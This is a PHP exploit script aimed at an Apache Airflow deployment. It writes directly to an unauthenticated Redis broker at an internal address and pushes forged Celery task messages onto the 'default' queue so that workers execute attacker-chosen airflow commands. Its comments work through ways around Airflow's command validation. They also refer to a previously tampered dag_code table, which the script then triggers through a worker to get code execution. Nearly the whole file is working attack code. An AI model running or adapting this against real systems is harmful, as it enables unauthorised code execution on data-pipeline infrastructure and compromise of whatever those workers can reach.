<?php
$s=fsockopen("172.18.0.3",6379,$e,$m,5);
if(!$s){echo "FAIL:$m\n";exit;}
fwrite($s,"PING\r\n");
echo "P:".trim(fgets($s))."\n";
$tid=uniqid("af",true);

// Try "airflow" command that executes bash 
// airflow tasks run <dag_id> <task_id> <execution_date>
// OR: just use bash -c with airflow prefix
// Airflow execute_command does: subprocess.Popen(command_to_exec)
// It validates command[0] or command[2] starts with "airflow"
// 
// Actually: Airflow 2.x has VALIDATE_CELERY_COMMAND
// It checks: command must contain "airflow" as program
// So we need: ["airflow", "version"] or similar

// Trick: use PATH manipulation - create script named "airflow" that runs our code
// OR: just use legitimate airflow command that has side effects

// SIMPLEST: airflow eval "python_code" — does this exist?
// In Airflow 2.x: "airflow tasks test" can run a task locally

// Actually the simplest bypass: Airflow checks if command[0] == "airflow"
// Let's try: ["airflow", "version"] first to see if it gets executed
$cmd_arr = array("airflow", "version");

$body = array(array($cmd_arr), (object)array(), (object)array());
$body_b64 = base64_encode(json_encode($body));

$msg = json_encode(array(
    "body" => $body_b64,
    "content-encoding" => "utf-8",
    "content-type" => "application/json",
    "headers" => array(
        "lang" => "py",
        "task" => "airflow.executors.celery_executor.execute_command",
        "id" => $tid,
        "root_id" => $tid,
        "retries" => 0,
        "timelimit" => array(null, null),
        "origin" => "gen1@scheduler"
    ),
    "properties" => array(
        "correlation_id" => $tid,
        "reply_to" => "",
        "delivery_mode" => 2,
        "delivery_info" => array("exchange" => "", "routing_key" => "default"),
        "body_encoding" => "base64",
        "delivery_tag" => $tid
    )
));

$l = strlen($msg);
fwrite($s, "*3\r\n\$5\r\nLPUSH\r\n\$7\r\ndefault\r\n\$".$l."\r\n".$msg."\r\n");
echo "L:".trim(fgets($s))."\n";

// Now try with bash wrapped in airflow
$tid2=uniqid("bf",true);
// Airflow 2.10: execute_command does check like:
// if not command[0].endswith("airflow"): raise
// So: ["bash", "-c", "... ; airflow version"] won't pass
// BUT: ["/usr/bin/bash", "-c", "cmd"] where we symlink bash as airflow? complex

// Actually in Airflow 2.10: the validation is:
// _execute_in_subprocess(command_to_exec)
// which does: subprocess.Popen(command_to_exec, close_fds=True)
// The validation checks: _validate_celery_command(command_to_exec)
// which is: assert command_to_exec[0].endswith("airflow"), f"..."
// 
// SO: first element MUST end with "airflow"!
// Trick: use "airflow" as first arg but with PATH override
// OR: create wrapper script named "airflow" in PATH

// The ACTUAL BYPASS:
// airflow tasks run dag_id task_id execution_date --local
// This runs an EXISTING task
// We already MODIFIED dag_code table for 'bash' DAG
// Even though scheduler reads from file, WORKER reads from DB for task execution!

// Let's trigger bash DAG task check with Celery!
$cmd_arr2 = array("airflow", "tasks", "run", "bash", "check", "2026-01-01T00:00:00+00:00", "--local", "--force");

$body2 = array(array($cmd_arr2), (object)array(), (object)array());
$body_b64_2 = base64_encode(json_encode($body2));

$msg2 = json_encode(array(
    "body" => $body_b64_2,
    "content-encoding" => "utf-8",
    "content-type" => "application/json",
    "headers" => array(
        "lang" => "py",
        "task" => "airflow.executors.celery_executor.execute_command",
        "id" => $tid2,
        "root_id" => $tid2,
        "retries" => 0,
        "timelimit" => array(null, null),
        "origin" => "gen1@scheduler"
    ),
    "properties" => array(
        "correlation_id" => $tid2,
        "reply_to" => "",
        "delivery_mode" => 2,
        "delivery_info" => array("exchange" => "", "routing_key" => "default"),
        "body_encoding" => "base64",
        "delivery_tag" => $tid2
    )
));

$l2 = strlen($msg2);
fwrite($s, "*3\r\n\$5\r\nLPUSH\r\n\$7\r\ndefault\r\n\$".$l2."\r\n".$msg2."\r\n");
echo "L2:".trim(fgets($s))."\n";

sleep(2);
fwrite($s, "LLEN default\r\n");
echo "Q:".trim(fgets($s))."\n";
echo "T1:$tid T2:$tid2\n";
fclose($s);
